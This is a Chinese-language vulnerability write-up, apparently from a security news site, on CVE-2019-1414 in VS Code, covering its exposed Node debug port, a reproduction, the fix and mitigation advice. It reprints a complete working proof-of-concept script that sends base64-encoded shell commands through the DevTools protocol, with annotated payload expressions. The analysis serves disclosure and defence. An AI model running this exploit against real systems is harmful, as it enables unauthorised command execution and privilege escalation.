# Visual Studio Code本地代码执行漏洞(CVE-2019-1414)

阅读量 **1058115**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-11-08 10:45:28

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01f1f37ead8e8f1e3e.png)

## 背景

​ 微软在2015年推出的跨平台开源编辑器Visual Studio Code（VS
Code），凭借其开箱即用的便捷以及丰富的插件社区，迅速吸引了大批用户。在最新的PYPL
IDE[排行榜](http://pypl.github.io/IDE.html)中，VS Code已位列第六，并且仍处于上升趋势。

​ 几个月前，国外安全研究员[Tavis Ormandy](https://twitter.com/taviso)发现并提交了VS
Code中的一个本地命令执行漏洞(CVE-2019-1414)，并于最近披露。1.39版本之前的VS Code受此漏洞影响。

## 漏洞分析与复现

可以在[这里](https://code.visualstudio.com/updates/v1_38)找到老版本的vscode安装包，各个操作系统版本的都有，这里使用1.38
mac版本进行演示。

打开下载的vscode。通过ps可以看到，vscode默认开启了一个node js调试端口(`--inspect=13611`)。

    
    
    $ ps aux |grep inspect
    ch               95536   0.0  0.7  4815292  56884   ??  S     9:59上午   0:03.49 /private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Frameworks/Code Helper.app/Contents/MacOS/Code Helper --nolazy --inspect=13611 /private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Resources/app/out/bootstrap-fork --type=extensionHost
    ch               95748   0.0  0.0  4286472    840 s003  S+   10:42上午   0:00.01 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn inspect
    

我们可以通过api查看调试端口的信息：

    
    
    $ curl http://127.0.0.1:13611/json
    [ {
      "description": "node.js instance",
      "devtoolsFrontendUrl": "chrome-devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f",
      "devtoolsFrontendUrlCompat": "chrome-devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f",
      "faviconUrl": "https://nodejs.org/static/favicon.ico",
      "id": "09d445a2-c4ad-4082-b4ab-36de37ff910f",
      "title": "/private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Frameworks/Code Helper.app/Contents/MacOS/Code Helper[95536]",
      "type": "node",
      "url": "file://",
      "webSocketDebuggerUrl": "ws://127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f"
    } ]
    

在chrome中直接打开`devtoolsFrontendUrl`指向的链接，就可以得到一个浏览器调试终端，可以在里面执行js指令。  

漏洞作者给出的poc如下：

    
    
    //poc.js
    const fetch = require('node-fetch')
    const WebSocket = require('ws')
    
    function die (reason) {
      console.error(reason)
      process.exit(-1)
    }
    
    if (process.argv.length !== 5) {
      die('usage: node index.js <IP> <PORT> <COMMAND>')
    }
    
    const IP = process.argv[2]
    const PORT = process.argv[3]
    const COMMAND = process.argv[4]
    const COMMAND_B64 = base64(COMMAND)
    
    function base64 (data) {
      return Buffer.from(data).toString('base64')
    }
    
    async function getWsLink () {
      const res = await fetch(`http://${IP}:${PORT}/json`)
      const data = await res.json()
      return data[0].webSocketDebuggerUrl
    }
    
    async function main () {
      console.log(`[?] Getting webSocketDebuggerUrl from http://${IP}:${PORT}/json`)
      const wsLink = await getWsLink().catch(die)
      console.log(`[!] Found webSocketDebuggerUrl: ${wsLink}`)
      const socket = new WebSocket(wsLink)
    
      socket.onopen = async (event) => {
        console.log(`[?] Connection established to ${wsLink}`)
        socket.send(JSON.stringify({ id: 1, method: 'Runtime.enable' }))
        socket.send(JSON.stringify({
          id: 1,
          method: 'Runtime.evaluate',
          params: {
            expression: `spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}`
          }
        }))
    
        socket.send(JSON.stringify({
          id: 2,
          method: 'Runtime.evaluate',
          params: {
            expression: `spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}`
          }
        }))
    
        console.log(`[!] Executing: ${COMMAND}`)
        socket.send(JSON.stringify({
          id: 3,
          method: 'Runtime.evaluate',
          params: {
            expression: `spawnSync('/bin/bash', ['-c', 'echo ${COMMAND_B64} | base64 -d | /bin/bash'])`
          }
        }))
    
        socket.close()
      }
    
      socket.onmessage = (event) => {
        // console.log(event)
      }
    
      socket.onclose = (event) => {
        // console.log(event)
        if (event.wasClean) {
          console.log('[?] Connection closed cleanly')
        } else {
          console.log('[?] Connection died')
        }
      }
    
      socket.onerror = (error) => {
        console.log(error)
      }
    }
    
    main()
    

运行命令是`node poc.js [HOST] [PORT] [CMD]`  
我用下面的命令尝试了几次都没有成功往/tmp/a中写入东西，于是开始着手分析poc代码。

    
    
    node poc.js 127.0.0.1 13611 "pwd >/tmp/a"
    cat /tmp/a
    

getWsLink函数通过访问`http://127.0.0.1:13611/json`拿到webSocketDebuggerUrl。之后这个url被用来进行websocket连接。

    
    
    async function getWsLink () {
      const res = await fetch(`http://${IP}:${PORT}/json`)
      const data = await res.json()
      return data[0].webSocketDebuggerUrl
    }
    

建立websocket连接之后发送了4个数据包，这种数据包的协议是`Chrome DevTools Protocol`，大致结构是这样的：

    
    
    {
      id: 1,
      method: 'xxx',
      params: {} //可选
    }
    

这种协议一般用来调试和优化Chromium, Chrome浏览器，查阅文档后找到了poc中使用的两种method的相关信息。

![](https://p4.ssl.qhimg.com/t016e09f61e2a306142.png)

![](https://p0.ssl.qhimg.com/t017af441579c47d768.png)

可以看到两种method都在Runtime Domain分类下面，Runtime Domain把Javascript
runtime暴露在远程连接中，且命令执行副作用持久化。`Runtime.enable`使能执行环境、`Runtime.evaluate`用来执行具体命令。

之后就需要知道发送的这几个expression里面有什么，把几个包中的expression展开、[美化](https://beautifier.io/)之后，可以看的更清晰一些：

    
    
    // id=2
    spawn_sync = process.binding('spawn_sync');
    
    normalizeSpawnArguments = function(c, b, a) { //解析参数，c:process, b:args, a:options
        if (Array.isArray(b) ? b = b.slice(0) : (a = b, b = []), a === undefined && (a = {}), a = Object.assign({}, a), a.shell) {
            const g = [c].concat(b).join(' ');
            typeof a.shell === 'string' ? c = a.shell : c = '/bin/sh', b = ['-c', g];
        }
        typeof a.argv0 === 'string' ? b.unshift(a.argv0) : b.unshift(c);
        var d = a.env || process.env;
        var e = [];
        for (var f in d) e.push(f + '=' + d[f]); //加入环境变量
        return {
            file: c,
            args: b,
            options: a,
            envPairs: e
        };
    }
    
    // id=3
    spawnSync = function() { //主函数，用来执行命令
        var d = normalizeSpawnArguments.apply(null, arguments); 
        // arguments是函数的参数，https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arguments
        var a = d.options;
        var c;
        if (a.file = d.file, a.args = d.args, a.envPairs = d.envPairs, a.stdio = [{
                type: 'pipe',
                readable: !0,
                writable: !1
            }, {
                type: 'pipe',
                readable: !1,
                writable: !0
            }, {
                type: 'pipe',
                readable: !1,
                writable: !0
            }], a.input) {
            var g = a.stdio[0] = util._extend({}, a.stdio[0]);
            g.input = a.input;
        }
        for (c = 0; c < a.stdio.length; c++) {
            var e = a.stdio[c] && a.stdio[c].input;
            if (e != null) {
                var f = a.stdio[c] = util._extend({}, a.stdio[c]);
                isUint8Array(e) ? f.input = e : f.input = Buffer.from(e, a.encoding);
            }
        }
        var b = spawn_sync.spawn(a);
        if (b.output && a.encoding && a.encoding !== 'buffer')
            for (c = 0; c < b.output.length; c++) {
                if (!b.output[c]) continue;
                b.output[c] = b.output[c].toString(a.encoding);
            }
        return b.stdout = b.output && b.output[1], b.stderr = b.output && b.output[2], b.error && (b.error = b.error + 'spawnSync ' + d.file, b.error.path = d.file, b.error.spawnargs = d.args.slice(1)), b;
    }
    
    // 加的辅助调试内容
    function base64(data) {
        return Buffer.from(data).toString('base64')
    }
    const COMMAND = process.argv[2]
    const COMMAND_B64 = base64(COMMAND)
    
    //id=4
    spawnSync('/bin/bash', ['-c', `echo ${COMMAND_B64} | base64 -d | /bin/bash`])
    

id为2和3的表达式中定义了命令执行函数`spawnSync`，其中处理了诸如环境变量，输入输出这些细节。id为4的表达式中调用spawnSync来执行终端中传入的命令。

可以看到spawnSync函数返回了执行结果的stdout以及stderr，于是我修改了poc，把执行结果放入一个变量中，通过前面的文档可以知道，这种远程执行是有”副作用“的，所以在Chrome中的调试界面应该能打印这个变量，就可以看到报错信息。

![](https://p2.ssl.qhimg.com/t016d144356d8d95e5c.png)

![](https://p4.ssl.qhimg.com/t01d8bece70bc8043a8.png)

原来是mac上base64工具的参数和linux上的不太一样，🤦‍♀️。

    
    
    $ base64 --help
    Usage:    base64 [-hvD] [-b num] [-i in_file] [-o out_file]
      -h, --help     display this message
      -D, --decode   decodes input
      -b, --break    break encoded string into num character lines
      -i, --input    input file (default: "-" for stdin)
      -o, --output   output file (default: "-" for stdout)
    
    root@kali:~# base64 --help
    Usage: base64 [OPTION]... [FILE]
    Base64 encode or decode FILE, or standard input, to standard output.
    With no FILE, or when FILE is -, read standard input.
    Mandatory arguments to long options are mandatory for short options too.
      -d, --decode          decode data
      ........
    

把poc中的`base64 -d`换成`base64 -D`之后执行成功了。

![](https://p4.ssl.qhimg.com/t010673324e58b52f3e.png)

## 修复

此漏洞在 **1.39.1**
版本中得到[修复](https://github.com/microsoft/vscode/commit/7f87a64621b010ed8a7e171d07583921e8c1e8ac?diff=split)，默认情况下不再开启调试端口。

![](https://p2.ssl.qhimg.com/t0134b000e6633b83c8.png)

## 危害与安全建议

###  危害

​ 调试端口是暴露在本地的，所以不会有被远程攻击的危险，这一点降低了这个漏洞的危害程度。在渗透测试中，此漏洞可能会被用来进行bypass
uac、提权等攻击行为。

###  安全建议

  1. 尽快升级到最新版本
  2. 尽量避免在管理员权限下使用vscode

#  链接：

<https://iwantmore.pizza/posts/cve-2019-1414.html>

<https://github.com/phra/inspector-exploiter>

<https://github.com/aslushnikov/getting-started-with-cdp/blob/master/README.md>

<https://chromedevtools.github.io/devtools-protocol/tot/Runtime>

<https://github.com/b1tg/inspector-exploiter/blob/master/debug-expressions.js>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Slash** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/190323](/post/id/190323)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [VSC](/tag/VSC)

 **+1** __2赞

 __收藏

![](https://p4.ssl.qhimg.com/t0123e976b16531d055.jpg) Slash

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

